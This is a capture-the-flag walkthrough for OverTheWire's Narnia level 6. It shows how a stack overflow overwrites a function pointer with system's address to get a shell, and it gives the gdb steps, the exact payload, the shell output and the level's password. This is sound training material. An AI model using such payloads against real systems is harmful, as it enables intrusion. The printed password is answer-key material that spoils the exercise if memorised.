# Narnia Level 6 → 7

## Goal

Two 8-byte stack buffers, `b1` and `b2`. A function pointer `fp` is initialised to `puts`. If you can overwrite `fp` with a different function's address and then pass something useful into that function, you control execution. Overwrite `fp` with `system`'s address and arrange for the argument to `fp(b1)` to be `sh;` — you get a shell.

## Concepts you'll learn

- Overwriting a stack function pointer via an adjacent buffer overflow
- Finding libc function addresses (`system`, `puts`, etc.) under `gdb`
- Crafting a payload that does two jobs at once: the contents of `b1` double as both overflow filler **and** the argument passed to `system`

## Walkthrough

### 1. Read the source

```c
extern char **environ;

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char *) = (int(*)(char *))&puts, i;

    if(argc != 3){ ... }

    /* clear environment variables */
    for(i = 0; environ[i]; i++) memset(environ[i], '\0', strlen(environ[i]));

    strcpy(b1, argv[1]);
    strcpy(b2, argv[2]);

    fp(b1);
    exit(0);
}
```

Stack (roughly):

```
[ b1 8 bytes ][ b2 8 bytes ][ fp 4 bytes ]
```

`strcpy(b1, argv[1])` overflows `b1` → can clobber `b2` and `fp`. Then `fp(b1)` is called — so if `fp` = `system` and `b1` starts with `"sh;"`, you run `system("sh;...")` (the `;` makes the rest a no-op command and `sh` runs).

### 2. Find the address of `system`

```bash
$ gdb -q /narnia/narnia6
(gdb) b main
(gdb) run AAAA BBBB
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
```

Note: the exact address varies with libc version / ASLR. Find yours every run.

### 3. Craft the payload

`argv[1]` needs to be:

- Start with `sh;` (3 bytes) — becomes the string passed to `system`
- Plus 5 filler bytes to fill out `b1`'s 8 bytes
- Plus 4 bytes to clobber `b2` (with anything)
- Plus 4 bytes = address of `system` (little-endian)

Wait — look at the layout more carefully. `b1` (8) + `b2` (8) + `fp` (4). So writing 8 + 8 + 4 = 20 bytes clobbers `fp`. But we also want `b1` to start with `sh;` for `system(b1)` to do anything.

Axcheron's payload: `argv[1] = "sh;" + "AAAAA" + "\x50\xc8\xe4\xf7"` (total: 3 + 5 + 4 = 12 bytes — this assumes the layout has only 8 bytes between `b1` and `fp`, no `b2` in between, which happens with certain compilations). `argv[2]` is required but its contents don't matter: `" BBBB"` or similar.

If you find `fp` is further along, adjust. The core idea is unchanged.

### 4. Run it

```bash
$ /narnia/narnia6 $'sh;AAAAA\x50\xc8\xe4\xf7' BBBB
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
```

If you get a segfault, the offset or the `system` address is wrong for your run. Re-check under `gdb`.

## The answer

The password for `narnia7` is:

**`ahkiaziphu`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia6.html>
